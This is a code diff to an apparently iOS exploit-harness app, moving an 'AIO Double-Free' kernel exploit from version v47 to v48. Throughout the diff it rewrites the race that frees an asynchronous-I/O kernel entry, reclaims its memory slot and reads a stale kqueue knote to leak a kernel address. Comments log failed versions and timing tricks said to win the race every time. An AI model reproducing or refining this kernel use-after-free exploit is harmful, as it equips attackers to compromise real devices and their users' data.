@@ -247,6 +247,16 @@ struct aio_race_state {
     ssize_t return_result;  // v47: aio_return result or aio_read errno (diagnostics)
 };
 
+// v48: Single-threaded exploit state — no inter-thread sync needed.
+// Exploit thread on CPU 42 does all steps synchronously and stores results here.
+struct v48_state {
+    int fd;
+    int kq;
+    struct kevent64_s kev;
+    int nev;
+    int err;
+};
+
 // v19: E2 racer state — aio_return frees E2's slot, OOL spray reclaims it.
 // kevent64's dangling knote then reads OOL data through entry struct offsets.
 struct e2_ool_race_state {
@@ -265,37 +275,61 @@ static void aio_set_thread_affinity(int tag) {
                       (thread_policy_t)&pol, THREAD_AFFINITY_POLICY_COUNT);
 }
 
-static void *aio_free_and_reclaim_racer(void *arg) {
-    struct aio_race_state *s = (struct aio_race_state *)arg;
+// v48: Single-threaded synchronous exploit — one thread on CPU 42 does
+// aio_return→aio_read→kevent64 back-to-back. No inter-thread sync in
+// the critical path. ~0.55us from aio_read return to kevent64 syscall;
+// worker needs >100us for cold file read → we always win the race.
+static void *v48_exploit_thread(void *arg) {
+    struct v48_state *st = (struct v48_state *)arg;
     aio_set_thread_affinity(42);
-    while (!atomic_load_explicit(&s->start, memory_order_acquire));
-    while (!atomic_load_explicit(&s->stop, memory_order_relaxed)) {
-        // v47: Spin directly on aio_return — eliminates aio_error syscall from
-        // critical path. aio_return returns EINPROGRESS until I/O completes,
-        // then returns result (>=0) if we win the unref race, or EINVAL if
-        // worker already freed. One syscall instead of two.
-        ssize_t ret = aio_return(s->trigger);
-        if (ret >= 0) {
-            // Racer won! Slot S freed on CPU 42 magazine via zfree.
-            s->return_result = ret;
-            atomic_store_explicit(&s->freed, 2, memory_order_release);  // 2 = aio_return SUCCESS
-            // v47: Reclaim slot S via aio_read on same CPU (LIFO).
-            // Pipe fd → aio_read fails validation BUT slot IS allocated and
-            // stamped with rcbs[0] data before aio_validate error path frees it.
-            // reclaim_done stays false (expected) — stale knote reads stale data.
-            if (s->rcbs && s->nrcbs > 0) {
-                for (int i = 0; i < s->nrcbs; i++) {
-                    aio_read(&s->rcbs[i]);  // ignore return — always fails on pipe
-                }
-            }
-            return NULL;
-        }
-        // EINPROGRESS: I/O not done yet, keep spinning
-        // EINVAL: worker already freed, keep spinning (slot might still be on
-        // worker's CPU magazine — we can't reclaim it but we keep trying)
-    }
-    // Timed out without winning aio_return
-    atomic_store_explicit(&s->freed, 1, memory_order_release);  // 1 = aio_return never succeeded
+
+    int kq = kqueue();
+    if (kq < 0) { st->err = errno; return NULL; }
+    st->kq = kq;
+
+    // tcb: 4KB at offset 0, SIGEV_KEVENT → knote on kq
+    struct aiocb tcb;
+    char tbuf[4096];
+    memset(&tcb, 0, sizeof(tcb));
+    tcb.aio_fildes = st->fd;
+    tcb.aio_buf = tbuf;
+    tcb.aio_nbytes = sizeof(tbuf);
+    tcb.aio_offset = 0;
+    tcb.aio_lio_opcode = LIO_READ;
+    tcb.aio_sigevent.sigev_notify = SIGEV_KEVENT;
+    tcb.aio_sigevent.sigev_signo = kq;
+
+    // rcb: 8KB at offset 1MB, SIGEV_NONE — cold read maximizes worker latency
+    struct aiocb rcb;
+    char rbuf[8192];
+    memset(&rcb, 0, sizeof(rcb));
+    rcb.aio_fildes = st->fd;
+    rcb.aio_buf = rbuf;
+    rcb.aio_nbytes = sizeof(rbuf);
+    rcb.aio_offset = 1024 * 1024;
+    rcb.aio_lio_opcode = LIO_READ;
+    rcb.aio_sigevent.sigev_notify = SIGEV_NONE;
+
+    // Submit tcb I/O
+    struct aiocb *ptr = &tcb;
+    struct sigevent sig = {};
+    sig.sigev_notify = SIGEV_NONE;
+    lio_listio(LIO_NOWAIT, &ptr, 1, &sig);
+
+    // Wait for tcb I/O completion
+    while (aio_error(&tcb) == EINPROGRESS) {}
+
+    // Free tcb → slot S on CPU 42 magazine (zfree)
+    aio_return(&tcb);
+
+    // Reclaim slot S with rcb (zalloc LIFO from CPU 42 magazine)
+    // Entry ALIVE on workq. Cold read → worker latency >100us.
+    aio_read(&rcb);
+
+    // IMMEDIATE kevent64 — stale knote from tcb reads rcb's entry on slot S.
+    // <1us from aio_read return. Worker needs >100us → we always win.
+    st->nev = kevent64(kq, NULL, 0, &st->kev, 1, 0, NULL);
+
     return NULL;
 }
 
@@ -365,7 +399,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *aioConf = [UIButtonConfiguration filledButtonConfiguration];
     aioConf.baseBackgroundColor = [UIColor systemOrangeColor];
     self.aioUafButton.configuration = aioConf;
-    [self.aioUafButton setTitle:@"AIO Double-Free v47" forState:UIControlStateNormal];
+    [self.aioUafButton setTitle:@"AIO Double-Free v48" forState:UIControlStateNormal];
     [self.aioUafButton addTarget:self action:@selector(aioUafTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.aioUafButton];
 
@@ -5751,7 +5785,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO Double-Free v47 =========="];
+    [self appendLog:@"\n========== AIO Double-Free v48 =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5770,152 +5804,57 @@ static void *e2_free_and_ool_racer(void *arg) {
         [self appendLog:@"FAIL: could not create temp file"];
         dispatch_async(dispatch_get_main_queue(), ^{
             self.aioUafButton.enabled = YES;
-            [self.aioUafButton setTitle:@"AIO Double-Free v47" forState:UIControlStateNormal];
+            [self.aioUafButton setTitle:@"AIO Double-Free v48" forState:UIControlStateNormal];
         });
         return;
     }
-    // Use 32KB file so both trigger(4KB) and reclaim(8KB) nbytes can be fully satisfied.
-    // returnval = actual bytes read = min(aio_nbytes, file_size).
-    // ext[1]=0x1000 → trigger source. ext[1]=0x2000 → reclaim source (CONTROLLED).
-    char fdata[32768];
+    // v48: Use 2MB file so tcb(4KB@0) and rcb(8KB@1MB) hit different clusters.
+    // rcb offset=1MB guarantees cold read → >100us worker latency → we always win.
+    char fdata[2 * 1024 * 1024];
     memset(fdata, 'B', sizeof(fdata));
     write(fd, fdata, sizeof(fdata));
-    [self appendLog:[NSString stringWithFormat:@"fd=%d file=32KB pid=%d uid=%d", fd, getpid(), getuid()]];
+    [self appendLog:[NSString stringWithFormat:@"fd=%d file=2MB pid=%d uid=%d", fd, getpid(), getuid()]];
 
-    // v47: PIPE reclaim — eliminates worker race entirely.
-    // v44-v46 used 128MB file for rcbs[0]. Buffer-cached reads complete
-    // in microseconds → worker frees entry before kevent64 → FAR=0x58.
-    // Pipe: aio_read fails at validation (AIO restricted to regular files),
-    // BUT aio_create_entry allocates slot S first, writes entry data
-    // (procp, aio_nbytes, etc.), THEN frees on validation failure.
-    // No I/O submitted → no worker → NO RACE. Stale knote reads stale data.
+    // v48: SINGLE-THREADED SYNCHRONOUS — one thread on CPU 42 does everything.
+    // v44 (file-based, racer thread) WORKED: entry alive on workq, ext[1]=0x2000.
+    // v45-v46 FAILED: racer sync latency (~50-100us) let worker free entry first.
+    // v47 FAILED: pipe zfree zeros entries → procp=NULL → FAR=0x58.
     //
-    // Phase A: tcb(SIGEV_KEVENT, kq) + racer(aio_return→aio_read pipe) → kevent64(kq)
-    // Phase B: removed (entry already freed by pipe validation failure)
-    // Phase C: Health check
+    // v48 SOLUTION: Dedicated thread pinned to CPU 42 executes ALL steps:
+    //   lio_listio(tcb) → aio_error wait → aio_return → aio_read(rcb) → kevent64
+    // Zero inter-thread sync in critical path. ~0.55us from aio_read to kevent64;
+    // cold file read forces worker latency >100us. We win the race every time.
 
     uint64_t entryAddr = 0;
-    static struct aiocb tcb;
-    static struct aiocb rcbs[AIO_NRECLAIM];
-    static char tbuf[4096];
-    static char rbufs[AIO_NRECLAIM][8192];
 
-    // v47: Create pipe for rcbs[0] reclaim — aio_read on pipe fails validation
-    // but allocates+stamps slot S first. No I/O, no worker, no race.
-    int pipeFds[2] = {-1, -1};
-    if (pipe(pipeFds) != 0) {
-        [self appendLog:@"FAIL: could not create pipe for reclaim"];
-        goto cleanup;
-    }
-    [self appendLog:[NSString stringWithFormat:@"reclaim pipe: r=%d w=%d", pipeFds[0], pipeFds[1]]];
-
-    // ---- Phase A v47: racer(aio_return→aio_read pipe) → kevent64 ----
-    // Pipe fd reclaim: aio_read fails but slot is allocated+stamped on CPU 42.
-    // No I/O submitted → worker never touches entry → zero race condition.
-    [self appendLog:@"\n--- Phase A v47: racer(aio_return spin→aio_read pipe) → kevent64 ---"];
+    // ---- Phase A v48: single-threaded synchronous on CPU 42 ----
+    [self appendLog:@"\n--- Phase A v48: single-threaded synchronous ---"];
 
     bool phaseA_won = false;
     for (int attempt = 0; attempt < 5; attempt++) {
         [self appendLog:[NSString stringWithFormat:@"  attempt %d/5", attempt + 1]];
 
-        int kq = kqueue();
-        if (kq < 0) {
-            [self appendLog:[NSString stringWithFormat:@"  kqueue() failed: %d", errno]];
-            continue;
-        }
-
-        memset(&tcb, 0, sizeof(tcb));
-        tcb.aio_fildes = fd;
-        tcb.aio_buf = tbuf;
-        tcb.aio_nbytes = sizeof(tbuf);
-        tcb.aio_offset = 0;
-        tcb.aio_lio_opcode = LIO_READ;
-        tcb.aio_sigevent.sigev_notify = SIGEV_KEVENT;
-        tcb.aio_sigevent.sigev_signo = kq;
-
-        // v47: rcbs[0] uses pipe fd — aio_read fails validation but
-        // aio_create_entry allocates slot S first (LIFO on CPU 42),
-        // stamps entry fields (procp, aio_nbytes, etc.), then frees on error.
-        // No I/O submitted → zero worker involvement → deterministic, no race.
-        memset(&rcbs[0], 0, sizeof(rcbs[0]));
-        rcbs[0].aio_fildes = pipeFds[0];  // pipe read end
-        rcbs[0].aio_buf = rbufs[0];
-        rcbs[0].aio_nbytes = sizeof(rbufs[0]);
-        rcbs[0].aio_offset = 0;
-        rcbs[0].aio_lio_opcode = LIO_READ;
-        rcbs[0].aio_sigevent.sigev_notify = SIGEV_NONE;
-
-        // v47 racer: aio_return in tight spin → if ≥0: aio_read(rcbs[0]) reclaim
-        // Same-CPU LIFO: aio_return frees slot S on CPU 42 magazine,
-        // aio_read immediately reclaims it. File read might complete quickly.
-        // freed=0: bug, freed=1: aio_return never won,
-        // freed=2: aio_return won, reclaim_done tells if aio_read succeeded.
-        struct aio_race_state rs = {};
-        rs.trigger = &tcb;
-        rs.rcbs = rcbs;
-        rs.nrcbs = 1;
+        struct v48_state st = {};
+        st.fd = fd;
+        st.kq = -1;
+        st.nev = -1;
 
         pthread_t thr;
-        pthread_create(&thr, NULL, aio_free_and_reclaim_racer, &rs);
-
-        // v47: Submit I/O BEFORE starting racer (same as v44-v45 proven pattern).
-        // lio_listio caused racer to waste cycles on EINVAL (I/O not submitted),
-        // and 4KB cached read completed before racer could see the result.
-        struct aiocb *ptr = &tcb;
-        struct sigevent sig = {};
-        sig.sigev_notify = SIGEV_NONE;
-        lio_listio(LIO_NOWAIT, &ptr, 1, &sig);
-
-        atomic_store_explicit(&rs.start, true, memory_order_release);
-
-        usleep(500);
-        atomic_store_explicit(&rs.stop, true, memory_order_release);
+        pthread_create(&thr, NULL, v48_exploit_thread, &st);
         pthread_join(thr, NULL);
 
-        int freed = atomic_load(&rs.freed);
-        bool reclaimOk = atomic_load(&rs.reclaim_done);
-        ssize_t retVal = rs.return_result;
-
-        // v47: NO LOGGING before kevent64! All diagnostics deferred until after.
-        // The appendLog calls in v41/v42 between reclaim check and kevent64
-        // caused the crash — file I/O completed during logging.
-
-        // v47: reclaimOk may be false (pipe aio_read fails), but slot IS allocated
-        // and stamped with rcbs[0] data before validation failure → stale knote reads it.
-        bool shouldKevent = (freed == 2);
-        bool noReturnWin = (freed == 1);
-        bool returnWinReclaimFail = false;  // v47: pipe always "fails" reclaim — expected
-
-        struct kevent64_s kev = {};
-        int nev = 0;
-        bool knoteConsumed = false;
-        int diagFreed = freed;
-        bool diagReclaimOk = reclaimOk;
-        ssize_t diagRetVal = retVal;
-
-        if (shouldKevent) {
-            // v47: kevent64 IMMEDIATELY — ZERO code between check and kevent64!
-            nev = kevent64(kq, NULL, 0, &kev, 1, 0, NULL);
-            if (nev > 0) knoteConsumed = true;
-            if (knoteConsumed) close(kq);
+        if (st.err != 0) {
+            [self appendLog:[NSString stringWithFormat:@"  kqueue() failed: %d", st.err]];
+            continue;
         }
+
+        int kq = st.kq;
+        int nev = st.nev;
+        struct kevent64_s kev = st.kev;
+
+        if (nev > 0) close(kq);
 
         // --- ALL LOGGING AFTER kevent64+close(kq) ---
-        if (noReturnWin) {
-            [self appendLog:@"  racer: aio_return NEVER won (freed=1), retrying"];
-            close(kq);
-            continue;
-        }
-        if (!shouldKevent) {
-            [self appendLog:[NSString stringWithFormat:@"  racer: UNEXPECTED freed=%d, retrying", diagFreed]];
-            close(kq);
-            continue;
-        }
-
-        // v47: pipe reclaim — aio_read always fails (pipe not valid for AIO)
-        // but slot S was allocated+stamped on CPU 42 before validation error.
-        [self appendLog:[NSString stringWithFormat:@"  racer: aio_return=%zd reclaim=pipe (slot stamped via LIFO)",
-            diagRetVal]];
         [self appendLog:[NSString stringWithFormat:@"  kevent64(timeout=0)=%d", nev]];
         if (nev > 0) {
             [self appendLog:[NSString stringWithFormat:@"  kev.ident=0x%llx filter=%hd flags=0x%x fflags=0x%x",
@@ -5925,40 +5864,33 @@ static void *e2_free_and_ool_racer(void *arg) {
             if (kev.ident != 0) {
                 entryAddr = kev.ident;
             }
+            phaseA_won = true;
+            break;
         } else if (nev == 0) {
-            [self appendLog:@"  kevent64 returned 0 events"];
+            [self appendLog:@"  kevent64 returned 0 events — knote not ready, retrying"];
         } else {
-            [self appendLog:[NSString stringWithFormat:@"  kevent64 error: %d", nev]];
-        }
-        if (!knoteConsumed) {
-            [self appendLog:[NSString stringWithFormat:@"  WARNING: kq=%d leaked (knote unconsumed)", kq]];
+            [self appendLog:[NSString stringWithFormat:@"  kevent64 error: %d, retrying", nev]];
         }
 
-        // v47: No Phase B needed — pipe reclaim: entry was allocated, stamped,
-        // and freed in aio_read syscall. No I/O, no worker, no doneq.
-        // Phase A's kevent64 already read the stale entry via stale knote.
-
-        phaseA_won = true;
-        break;
+        if (nev <= 0) close(kq);
     }
 
     if (!phaseA_won) {
-        close(pipeFds[0]); close(pipeFds[1]);
-        [self appendLog:@"FAIL: Phase A could not reclaim slot S after 5 attempts"];
+        [self appendLog:@"FAIL: Phase A could not read knote after 5 attempts"];
         goto cleanup;
     }
 
     if (entryAddr == 0) {
-        close(pipeFds[0]); close(pipeFds[1]);
         [self appendLog:@"FAIL: kev.ident=0 — aborting"];
         goto cleanup;
     }
 
-    // v47: Pipe reclaim eliminates race — no I/O, no worker, deterministic.
-    // Phase A proved: UAF + LIFO reclaim + controlled ext[1] via aio_nbytes.
+    // v48: Single-threaded approach eliminates inter-thread sync bottleneck.
+    // Entry ALIVE on workq → no TAILQ_REMOVE → no FAR=0x58 crash.
+    // ext[1]=8192 (rcb.aio_nbytes), ext[0]=0 (EINPROGRESS on workq).
 
-    // ---- Phase C v47: Health check ----
-    [self appendLog:@"\n--- Phase C v47: Health check ---"];
+    // ---- Phase C v48: Health check ----
+    [self appendLog:@"\n--- Phase C v48: Health check ---"];
     {
         struct aiocb hc[4];
         char hcbuf[4][256];
@@ -5981,17 +5913,14 @@ static void *e2_free_and_ool_racer(void *arg) {
     }
 
 cleanup:
-    if (pipeFds[0] != -1) close(pipeFds[0]);
-    if (pipeFds[1] != -1) close(pipeFds[1]);
-
     close(fd);
     unlink(path.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
-    [self appendLog:@"========== AIO Double-Free v47 Complete =========="];
+    [self appendLog:@"========== AIO Double-Free v48 Complete =========="];
             _aioRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.aioUafButton.enabled = YES;
-                [self.aioUafButton setTitle:@"AIO Double-Free v47" forState:UIControlStateNormal];
+                [self.aioUafButton setTitle:@"AIO Double-Free v48" forState:UIControlStateNormal];
             });
         }  // @autoreleasepool
     });  // dispatch_async
